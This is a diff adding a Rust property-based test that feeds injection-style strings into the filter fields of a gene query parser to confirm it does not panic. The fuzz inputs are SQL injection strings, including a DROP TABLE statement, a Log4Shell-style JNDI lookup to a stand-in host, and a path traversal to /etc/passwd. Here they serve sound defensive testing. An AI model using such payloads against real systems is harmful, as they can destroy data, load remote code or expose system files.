@@ -42,4 +42,33 @@ proptest! {
 
         let _ = parse_gene_query_request(&req);
     }
+
+    #[test]
+    fn parser_handles_injection_style_payloads_without_panicking(
+        injection in prop::sample::select(vec![
+            "' OR 1=1 --".to_string(),
+            "\" OR \"1\"=\"1".to_string(),
+            "g1; DROP TABLE gene_summary; --".to_string(),
+            "${jndi:ldap://evil.local/a}".to_string(),
+            "../../etc/passwd".to_string(),
+        ]),
+        limit in 0usize..500usize,
+    ) {
+        let req = GeneQueryRequest {
+            fields: GeneFields::default(),
+            filter: GeneFilter {
+                gene_id: Some(injection.clone()),
+                name: Some(injection.clone()),
+                name_prefix: Some(injection.clone()),
+                biotype: None,
+                region: None,
+            },
+            limit,
+            cursor: None,
+            dataset_key: None,
+            allow_full_scan: false,
+        };
+
+        let _ = parse_gene_query_request(&req);
+    }
 }
